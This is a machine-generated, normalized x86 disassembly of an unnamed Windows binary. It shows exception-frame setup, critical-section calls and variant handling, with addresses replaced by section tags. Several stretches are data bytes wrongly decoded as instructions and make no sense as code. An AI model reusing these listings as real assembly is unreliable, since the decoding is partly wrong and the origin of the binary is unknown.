mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
jmp r-xdata
inc eax
mov ecx [ rw-data ]
xor esi esi
mov [ ecx + edx * 4 ] esi
inc edx
dec eax
jne r-xdata
sub_415050
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_415074
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4150d7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4150de
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_4151c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41526c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_415515
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov al [ eax + ebx + 0x3 ]
mov edx eax
and dl 0x7f
mov esi edx
and esi 0xff
mov edx [ ebp + 0x8 ]
test al 0x80
setne al
cmp esi 0xa
jne r-xdata
cmp esi 0x48
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
lea eax [ edx + eax * 8 ]
call sub_413ee4
jmp r-xdata
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0xc ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x8 ]
lea esi [ ecx + edx * 8 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41551c
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f90
retn
cmp esi 0xc
jne r-xdata
cmp esi 0xc
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40448c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4047c4
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_4047d4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40448c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4047c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] 0x4008
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx esi
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + eax * 8 ] si
lea edx [ esi + esi * 2 ]
mov ecx [ rw-data ]
mov edx [ ecx + edx * 4 + 0x4 ]
dec edx
sub edx 0x2
jb r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0x10 ]
cmp [ edi ] 0x100
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
or si 0x4000
mov [ edx + eax * 8 ] si
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
jmp r-xdata
dec edx
je r-xdata
mov eax ebx
add eax eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi edi
lea edi [ edx + eax * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
lea esi [ edx + eax * 8 ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_40448c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047c4
xor eax eax
mov [ esi + 0x4 ] eax
mov edi ebx
add edi edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ eax + edi * 8 ] 0x8
mov eax [ esi ]
call sub_4047d4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + edi * 8 + 0x8 ] eax
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
jmp r-xdata
push 0x8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax ]
mov ecx eax
mov edx [ ebp + 0x8 ]
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_415170
sub edx 0x4
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx ]
mov [ edx + eax * 8 + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x10 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + eax * 8 + 0xc ] ecx
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x4
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_415130
sub_415524
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4157c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x1 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x38 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x20 ]
lea edx [ edx + ecx + 0x3 ]
call sub_404164
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051d0
add esp 0x4
mov esi [ ebp - 0x20 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax ]
dec al
je r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
dec al
je r-xdata
push ebp
mov eax ebx
call sub_41526c
pop ecx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x44 ]
test al al
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
sub al 0x2
je r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x48 ]
test al al
jne r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_415154
xor eax eax
push ebp
push sub_41566f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
call sub_413ee4
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_415130
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_415130
jmp r-xdata
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4157c7
lea eax [ ebp - 0x3c ]
call sub_404678
lea eax [ ebp - 0x38 ]
call sub_403f6c
lea eax [ ebp - 0x24 ]
call sub_403f6c
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4052f0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4052f0
retn
dec ebx
mov eax [ ebp - 0x8 ]
lea esi [ eax + ebx * 8 ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x14 ]
call sub_41515c
retn
mov eax [ ebp - 0x14 ]
call sub_415130
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_415130
jmp r-xdata
cmp [ ebp - 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_415130
mov eax [ ebp - 0x14 ]
call sub_415130
jmp r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov eax [ esi ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404874
mov edx [ ebp - 0x3c ]
mov eax [ esi + 0x4 ]
call sub_4041f4
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x4c ]
test al al
jne r-xdata
sub_415800
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4158a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405014
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_4158b8
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41598e
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_415971
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40501c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415978
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_40316c
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_4041d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_40800c
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_4159a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415a17
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a1e
retn
call sub_414c30
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4052f0
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
call sub_403f6c
mov eax rw-data
call sub_40f188
sub_415a20
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_415ac1
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415ac8
retn
mov eax rw-data
call sub_413ee4
mov eax sub_40ee88
mov [ rw-data ] eax
mov eax sub_40ea2c
mov [ rw-data ] eax
mov edx sub_40e93c
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40f188
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413ac8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f49c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412704
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412e2c
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_415acc
push 0x92004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add [ ebx + 0x680000ff ] dl
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] bl
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] dl
inc edi
add [ ebp + 0x680000ff ] dl
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] bl
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] dl
jbe r-xdata
in al dx
add [ eax + 0x680000ff ] cl
jbe r-xdata
inc edi
add [ edi + 0x680000ff ] bl
jbe r-xdata
inc edi
add [ eax + 0x680000ff ] al
jbe r-xdata
inc edi
add [ edi + 0x680000ff ] dl
jbe r-xdata
mov [ fs : eax ] esp
inc [ rw-data ]
add [ edi + edi * 8 + 0x30 ] ah
add [ ecx + 0x680000ff ] cl
jbe r-xdata
xor eax eax
pop edx
add eax rw-data
add [ edx + 0x680000ff ] cl
jbe r-xdata
inc edi
add [ ecx + 0x680000ff ] al
jbe r-xdata
inc edi
add [ eax + 0x680000ff ] bl
jbe r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415bf0
retn
add [ ebx + 0x680000ff ] cl
jbe r-xdata
inc edi
add [ edx + 0x680000ff ] al
jbe r-xdata
inc edi
add [ ecx + 0x680000ff ] bl
jbe r-xdata
inc ecx
add bl al
jmp sub_403970
add [ edi + edi * 8 + 0x76680000 ] cl
inc edi
add [ ebx + 0x680000ff ] al
jbe r-xdata
inc edi
add [ edx + 0x680000ff ] bl
jbe r-xdata
inc eax
js r-xdata
add [ esi + 0x680000ff ] cl
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] cl
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] al
inc edi
add [ ebx + 0x680000ff ] bl
jbe r-xdata
add [ edx ] al
push 0x3f895c17
lea eax [ edx - 0x7b ]
push cs
lahf
push esp
cmc
or al 0x22
xchg ebx eax
sub eax 0x1000415c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5cac0040 ] cl
inc ecx
add [ 0x415c ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
inc ecx
add [ eax + eax ] dl
add [ eax ] al
int3
add [ ecx ] al
retn
shl al 0x50
mov eax [ eax ]
mov eax [ eax + 0x50 ]
add [ edi + 0x680000ff ] cl
jbe r-xdata
inc edi
add [ esi + 0x680000ff ] al
jbe r-xdata
inc edi
add [ ebp + 0x680000ff ] al
jbe r-xdata
add [ edi + edi * 8 + 0x76680000 ] bl
xchg [ esp ] eax
retn
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ eax - 0x1 ] dh
add [ eax ] al
push ebp
mov ebp esp
inc edi
add [ edi + 0x680000ff ] al
jbe r-xdata
sub_415d1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ebp
inc ecx
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
pop ecx
pop edx
pop ebx
retn
jb r-xdata
jo r-xdata
and edx ebx
jns r-xdata
je r-xdata
jb r-xdata
inc esp
and al 0x4
or edx [ edx + ebp * 2 ]
outsd
outsb
jbe r-xdata
clc
inc edi
add [ edx + 0x5d18a101 ] dh
inc ecx
add al ch
xchg ebp eax
pop ebx
jb r-xdata
popad
insb
jns r-xdata
or al 0x24
mov esi edx
mov ebx eax
mov eax ebx
call sub_403164
mov ecx [ esp ]
mov edx esi
jb r-xdata
call sub_415e50
pop edx
pop esi
outsd
jb r-xdata
pop ebx
retn
add [ edx + 0x5e ] bl
add [ eax ] al
add bh bh
jb r-xdata
salc
inc ebp
inc eax
add [ esi ] cl
inc ebp
push eax
jb r-xdata
sar bh 0xff
jae r-xdata
outsd
jb r-xdata
bound ebp [ ecx + ebp * 2 + 0x73 ]
push 0x656c6261
push esi
popad
jb r-xdata
rcr [ ebp + 0x41 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ ebp + 0x41 ] 0x0
or al 0x0
popad
outsb
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
add al 0xb
push esp
push 0x0
inc eax
add [ 0x6f725045 ] dl
jo r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
jns r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
pop ebp
inc ecx
add [ eax + eax ] cl
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
pop ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebx * 2 + 0x41 ] ah
sub_415e04
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
pop ecx
pop edx
pop ebx
retn
sub_415e30
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_403164
mov ecx [ esp ]
mov edx esi
call sub_415e50
pop edx
pop esi
pop ebx
retn
sub_415e50
push ebx
push esi
push ecx
mov [ esp ] ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_40345c
mov ecx [ esp ]
mov edx esi
call sub_4166a8
pop edx
pop esi
pop ebx
retn
sub_415e70
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4160c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_4159a0
mov ecx [ r-xdata ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_415e30
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov esi [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415e04
jmp r-xdata
lea eax [ esi + 0x1 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
jmp [ eax * 4 + jump_table_415ee1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4160ce
lea eax [ ebp - 0x18 ]
call sub_404678
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f90
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4166e0
mov edx eax
mov eax edi
mov cl 0xfc
call sub_41357c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416ed8
mov eax edi
call sub_413774
jmp r-xdata
mov eax edi
lea edx [ esi + 0x1 ]
call sub_4137dc
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416cb0
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_4137b0
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416d1c
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_41382c
jmp r-xdata
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4171fc
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4172b4
push edx
push eax
mov eax edi
call sub_413678
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4166e0
mov edx eax
mov eax [ ebx ]
mov ecx [ eax ]
mov eax edi
call sub_4145ac
jmp r-xdata
mov eax esi
call sub_4164a4
mov eax [ eax + 0x9 ]
mov eax [ eax ]
cmp eax [ r-xdata ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4167b0
mov edx [ ebp - 0xc ]
mov eax edi
call sub_4137b0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4166e0
mov edx eax
mov eax edi
mov cl 0xfc
call sub_41357c
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416824
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_4137b0
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4166e0
mov edx eax
mov eax edi
mov cl 0xfc
call sub_41357c
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4166e0
mov edx eax
mov eax edi
call sub_41374c
jmp r-xdata
sub_4160dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
call sub_4116f4
call sub_4029f8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0x14 ]
jne r-xdata
jl r-xdata
cmp eax [ ebp + 0x10 ]
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x10
jmp r-xdata
sub_416144
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_4163f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ r-xdata ]
mov edx esi
mov eax edi
call sub_415e30
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebx ]
mov eax [ eax ]
call sub_4164a4
mov esi eax
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
mov eax esi
call sub_415e04
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax ]
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x4
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
jmp [ eax * 4 + jump_table_4161b3 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4163ff
lea eax [ ebp - 0x18 ]
call sub_404678
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f90
retn
mov eax [ esi + 0x5 ]
cmp eax [ esi + 0x1 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_413dbc
cmp ax 0x100
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_413dbc
cmp ax 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4116f4
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx ebx
mov eax edi
call sub_416ff0
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_413e04
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax edi
call sub_416cf0
jmp r-xdata
lea edx [ ebp - 0x18 ]
